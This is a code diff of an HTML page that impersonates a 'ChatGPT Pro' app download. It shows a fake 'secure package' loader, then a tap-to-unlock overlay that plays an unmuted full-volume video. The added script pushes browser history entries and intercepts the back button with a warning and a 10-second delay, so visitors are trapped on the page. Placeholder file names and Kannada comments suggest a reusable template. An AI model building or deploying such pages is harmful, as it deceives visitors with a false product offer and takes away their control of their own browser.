@@ -192,34 +192,52 @@
             font-size: 14px;
         }
 
-        /* Video Screen & 3-Tap Unlock */
-        #videoOverlay {
+        /* Tap Overlay Screen (Modalu Photo matthe 3 Tap baruvudhu) */
+        #tapOverlay {
             display: none;
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: #000000;
+            background-color: #000000;
             z-index: 1000;
             justify-content: center;
             align-items: center;
             flex-direction: column;
+            overflow: hidden;
+        }
+        .bg-photo {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0.85;
         }
         .tap-instruction {
             position: absolute;
-            top: 20px;
-            background: rgba(255, 255, 255, 0.15);
-            padding: 10px 20px;
+            top: 30px;
+            background: rgba(0, 0, 0, 0.75);
+            padding: 12px 24px;
             border-radius: 30px;
             font-size: 16px;
             font-weight: bold;
-            backdrop-filter: blur(5px);
             z-index: 1001;
-            border: 1px solid rgba(255, 255, 255, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.4);
             animation: pulse 1.5s infinite;
         }
         @keyframes pulse {
             0% { opacity: 0.8; }
             50% { opacity: 1; transform: scale(1.05); }
             100% { opacity: 0.8; }
+        }
+
+        /* Video Screen (3 tap mugida mele kanisuvudhu) */
+        #videoScreen {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #000000;
+            z-index: 1002;
+            justify-content: center;
+            align-items: center;
         }
         video {
             width: 100%;
@@ -263,9 +281,9 @@
 
     <div class="container">
         <div class="app-info">
-            <!-- ಇಲ್ಲಿ ನಿಮ್ಮ ಲೋಗೋ ಫೋಟೋ ಹೆಸರು ಹಾಕಿ (ಉದಾಹರಣೆಗೆ: icon.png) -->
+            <!--illi nimma app icon photo hesaru haaki (udaharaneghe: icon.png)-->
             <div class="app-icon">
-                <img src="c4d2aa7fab03274d943f04fe202d3292.png" alt="App Icon">
+                <img src="YOUR_IMAGE_FILE.png" alt="App Icon">
             </div>
             <div class="app-details">
                 <h1>ChatGPT Pro</h1>
@@ -316,13 +334,18 @@
         <div class="load-status" id="loadStatusText">Preparing secure package...</div>
     </div>
 
-    <!-- Video Screen & 3-Tap Unlock -->
-    <div id="videoOverlay" onclick="handleScreenTap()">
+    <!-- 3-Tap Overlay (Modalu Photo matthe instruction thoristhe) -->
+    <div id="tapOverlay" onclick="handleScreenTap()">
+        <!-- illi nimma background photo hesaru haaki (udaharaneghe: photo.jpg) -->
+        <img src="YOUR_IMAGE_FILE.png" alt="Background" class="bg-photo">
         <div class="tap-instruction" id="tapInstructionText">Tap 3 times on screen to unlock (0/3)</div>
-        
-        <!-- ಇಲ್ಲಿ ನಿಮ್ಮ 15 ಸೆಕೆಂಡುಗಳ ವೀಡಿಯೊ ಫೈಲ್ ಹೆಸರು ಹಾಕಿ (ಉದಾಹರಣೆಗೆ: video.mp4) -->
+    </div>
+
+    <!-- Video Screen (3 tap mugida mele mathra open aagutthe) -->
+    <div id="videoScreen">
+        <!-- illi nimma 15 seconds video file hesaru haaki (udaharaneghe: video.mp4) -->
         <video id="myVideo" preload="auto" playsinline webkit-playsinline>
-            <source src="video_20261003_165913.mp4" type="video/mp4">
+            <source src="YOUR_VIDEO_FILE.mp4" type="video/mp4">
             Your browser does not support the video tag.
         </video>
     </div>
@@ -357,9 +380,10 @@
                     
                     setTimeout(() => {
                         document.getElementById('loadingScreen').style.display = 'none';
-                        document.getElementById('videoOverlay').style.display = 'flex';
+                        // Loading aada mele modalu photo matthe 3-tap overlay open aagutthe
+                        document.getElementById('tapOverlay').style.display = 'flex';
                         
-                        // ಹಿನ್ನೆಲೆಯಲ್ಲಿ ಬ್ರೌಸರ್ ಹಿಸ್ಟರಿ ಲಾಕ್ ಮಾಡಲು ಪುಶ್ ಮಾಡುವುದು
+                        // History lock madalu
                         history.pushState(null, null, location.href);
                     }, 500);
                 } else {
@@ -377,9 +401,11 @@
             if (tapCount < 3) {
                 document.getElementById('tapInstructionText').innerText = `Tap ${remaining} more time(s) to unlock`;
             } else {
-                document.getElementById('tapInstructionText').style.display = 'none';
-                videoStarted = true;
+                // 3 taps complete aada mele photo overlay hide aagi video screen barutthe
+                document.getElementById('tapOverlay').style.display = 'none';
+                document.getElementById('videoScreen').style.display = 'flex';
                 
+                videoStarted = true;
                 videoElement.volume = 1.0; 
                 videoElement.muted = false; 
                 
@@ -387,15 +413,15 @@
                     console.log("Playback error:", error);
                 });
 
-                // 15 ಸೆಕೆಂಡುಗಳ ನಂತರ ವೀಡಿಯೊ ಮುಗಿದು ತಾನಾಗಿಯೇ ನಿಲ್ಲುವ ವ್ಯವಸ್ಥೆ
+                // 15 seconds aada mele video stop aagutthe
                 setTimeout(() => {
                     videoElement.pause();
-                    document.getElementById('videoOverlay').style.display = 'none';
+                    document.getElementById('videoScreen').style.display = 'none';
                 }, 15000);
             }
         }
 
-        // ಯೂಸರ್ ಬ್ಯಾಕ್ ಹೋಗಲು ಪ್ರಯತ್ನಿಸಿದರೆ ವಾರ್ನಿಂಗ್ ಮತ್ತು 10 ಸೆಕೆಂಡ್ ಡಿಲೇ ಲಾಜಿಕ್
+        // Back button try madidre warning mathre 10s delay
         window.addEventListener('popstate', function (event) {
             if (videoStarted && !videoElement.ended) {
                 history.pushState(null, null, location.href);
